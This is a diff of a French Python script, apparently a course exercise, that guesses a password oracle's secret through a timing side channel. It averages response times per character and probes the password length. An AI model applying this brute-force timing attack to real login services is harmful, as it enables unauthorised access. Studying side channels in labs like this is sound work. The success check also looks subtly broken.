@@ -13,6 +13,18 @@ def await_input() -> None:
 
     input("Appuyez sur Entrée pour continuer...")
 
+
+def connect_to_server(server="51.195.253.124", port=22222) -> socket:
+    soc_con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    try:
+        soc_con.connect((server, port))
+    except Exception as e:
+        print("Problème de connexion avec l'oracle", e.args)
+        sys.exit(1)
+
+    return soc_con
+
 def find_length_of_password(ma_socket: socket.socket, expected_message: string) -> int:
     """
     Fonction permettant de retourner la taille du mot de passe utilisé pour le serveur
@@ -47,16 +59,24 @@ def find_pin_without_optimisation(ma_socket: socket.socket, password_length: int
     caracters = ["a"] * password_length
     print('Recherche du mot de passe...')
     caracteres_ascii = string.printable
+    incorrect_message = repr(b'Bad password\n')
 
     for position in range(password_length):
         timers = []
         for caracter in caracteres_ascii:
-            timer_start = time.time()
-            ma_socket.sendall(bytes(caracter, 'utf-8'))
-            str(ma_socket.recv(1024))
-            timer_end = time.time()
-            timers.append((caracter, timer_end - timer_start))
+            sample_times = []
+            for _ in range(8):
+                timer_start = time.time()
+                ma_socket.sendall(bytes(caracter, 'utf-8'))
+                ma_socket.recv(1024)
+                timer_end = time.time()
+                sample_times.append(timer_end - timer_start)
+
+            avg_time = sum(sample_times) / len(sample_times)
+            timers.append((caracter, avg_time))
+
         caractere_max = max(timers, key=lambda x: x[1])[0]
+        print(f"Caractère{position}: {caractere_max}")
         caracters[position] = caractere_max
 
     caracters = ''.join(caracters)
@@ -64,7 +84,8 @@ def find_pin_without_optimisation(ma_socket: socket.socket, password_length: int
 
     ma_socket.sendall(bytes(str(caracters), 'utf-8'))
     ligne = str(ma_socket.recv(1024))
-    if not ligne == "b'Incorrect PIN\\n'":
+    print(ligne)
+    if not ligne == incorrect_message and len(ligne) == password_length:
         password_use = caracters
         password_found = True
 
@@ -106,29 +127,15 @@ if __name__ == "__main__":
     main_title = "Authentification à un site\nAppuyez sur les flèches pour naviguer et sur Entrée pour sélectionner"
     main_options = ["Méthode sans trier les codes possibles", None, "Quitter"]
     main_menu = TerminalMenu(main_options, title=main_title, cycle_cursor=True, clear_screen=True)
-    server = "51.195.253.124"
-    port = 12345
-    mode = 1
-
-    ma_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    try:
-        print(ma_socket)
-        ma_socket.connect((server, port))
-    except Exception as e:
-        print("Problème de connexion", e.args)
-        sys.exit(1)
-
-    ma_socket.recv(1024)
+    connection = connect_to_server()
 
 
     while True:
         main_entry_index = main_menu.show()
         if main_entry_index == 0:
-            expected_message = "Mettre le message attendu"
-            # password_length = find_length_of_password(ma_socket, expected_message)
-            find_pin_without_optimisation(ma_socket, 4)
-            ma_socket = restart_socket(ma_socket, server, port)
+            expected_message = repr(b'Bad password\n')
+            password_length = find_length_of_password(connection, expected_message)
+            find_pin_without_optimisation(connection, password_length)
             await_input()
         elif main_entry_index == len(main_options) - 1 or main_entry_index is None:
             print("Au revoir !")
